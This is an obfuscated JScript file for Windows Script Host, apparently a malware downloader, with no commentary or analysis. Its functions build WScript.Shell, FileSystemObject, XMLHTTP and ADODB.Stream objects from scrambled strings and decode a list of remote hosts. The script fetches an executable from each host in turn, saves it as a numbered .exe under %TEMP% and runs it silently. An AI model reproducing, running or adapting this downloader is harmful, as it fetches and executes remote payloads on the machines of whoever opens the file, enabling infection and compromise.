

function svHnJnuRt(lKNDeLBCgpv) {
var KfmLtncO = "Jcon Ws DoTQCUe cript.S MAcvri hell".split(" ");
var wGDYkxBt = WScript.CreateObject(KfmLtncO[1] + KfmLtncO[3] + KfmLtncO[5]);
wGDYkxBt.Run(lKNDeLBCgpv, 0x1, 0x0);
}
function kmAnwTKcb(iIHXP,dwAYp,uGLxx) {
var lYjSe = "yYkVCb SLY pt.Shell CURQMaK Scri  %TEMP%\\".split(" ");
var Ync=((1)?"W" + lYjSe[4]:"")+lYjSe[2];
var tM = WScript.CreateObject(Ync);
return tM.ExpandEnvironmentStrings(lYjSe[6]);
}
function AIFabHdN() {
var vmNuMTz = "Sc lYQfkgY r HktZmkIti ipting IouLRCH Hki ile SYLXfvUFjrYoFU System Jp RBMlh Obj FokGgF ect cjsKVGt".split(" ");
return vmNuMTz[0] + vmNuMTz[2] + vmNuMTz[4] + ".F" + vmNuMTz[7] + vmNuMTz[9] + vmNuMTz[12] + vmNuMTz[14];
}
function yoic(YljaJ) {
cKBkyXN = WScript.CreateObject(YljaJ);
return cKBkyXN
}
function SFaQ(KoRox,fXERP) {
KoRox.write(fXERP);
}
function Zuji(zsUuz) {
zsUuz.open();
}
function oldq(wzEHJ,KuPud) {
wzEHJ.saveToFile(KuPud,403-401);
}
function DmKl(wSjAu,pqBed,YRKxr) {
wSjAu.open(YRKxr,pqBed,false);
}
function sETt(glXko) {
if (glXko == 904-704){return true;} else {return false;}
}
function CVGx(KvkRa) {
if (KvkRa > 173530-978){return true;} else {return false;}
}
function zbcI(TAJKg) {
var vxGYI="";
for(T=(753-753); T < TAJKg.length; T++)
if (T % (165-163) != (326-326)) {
vxGYI += TAJKg.substr(T, 450-449);
}
return vxGYI;
}
function spQa(biRnl) {
biRnl.send();
}
function mhnP(hDiDX) {
return hDiDX.status;
}
function iCyup(UFkuRY) {
return new ActiveXObject(UFkuRY);
}
function NtHcPtA(enMv) {
enMv.position=0;
}
function uWLrvbn(cMDO) {
return cMDO.responseBody;
}
var jx="Bu7j3a4jjacjsgKosgHo2f7fi.RcEopm7/V8R0C.AewxkeE?y si0sztgh4eirLe8aGnPyrbfokdfyrqbqB.Hc5oxmO/c8g0y.8egxCep?k u?F I?h J?";
var k = zbcI(jx).split(" ");
var oAX = kmAnwTKcb("zdnJ","EdvBC","tWNaLa");
var vnJ = iCyup(AIFabHdN());
var MUtbLx = ("ihIgXjP \\").split(" ");
var AgXX = oAX+MUtbLx[0]+MUtbLx[1];
try{
vnJ.CreateFolder(AgXX);
}catch(OXEqtn){
};
var gLj = "2.XMLH";
var Otc = (gLj + "TTP" + " qSNeMkO ckzes XML ream St CemRZSug AD VaIAtBh OD").split(" ");
var PO = true  , MHJK = Otc[7] + "" + Otc[9];
var Nd = yoic("MS"+Otc[3]+(569300, Otc[0]));
var FBR = yoic(MHJK + "B." + Otc[5]+(734853, Otc[4]));
var GAg = 0;
var X = 1;
var PwHCZpo = 788481;
var Z=GAg;
while (true)  {
if(Z>=k.length) {break;}
var Fu = 0;
var yEm = ("ht" + " RHKgnCm tp oOSoB EECGzszZ :// KKuKWDZ .e xe G ET").split(" ");
try  {
var FdTaW=yEm[0]+yEm[2]+yEm[5];
DmKl(Nd,FdTaW+k[Z]+X, yEm[9]+yEm[10]); spQa(Nd); if (sETt(mhnP(Nd)))  {      
Zuji(FBR); FBR.type = 1; SFaQ(FBR,uWLrvbn(Nd)); if (CVGx(FBR.size))  {
Fu = 1; NtHcPtA(FBR);oldq(FBR,/*AzO865q6NN*/AgXX/*NION29h8Ov*/+PwHCZpo+yEm[7]+yEm[8]); try  {
if (((new Date())>0,7366373888)) {
svHnJnuRt(AgXX+PwHCZpo+/*uDhT74elOO*/yEm[7]+yEm[8]/*tqFl588Myh*/); 
break;
}
}
catch (QK)  {
}; 
}; FBR.close(); 
}; 
if (Fu == 1)  {
GAg = Z; break; 
}; 
}
catch (QK)  { 
}; 
Z++;
}; 

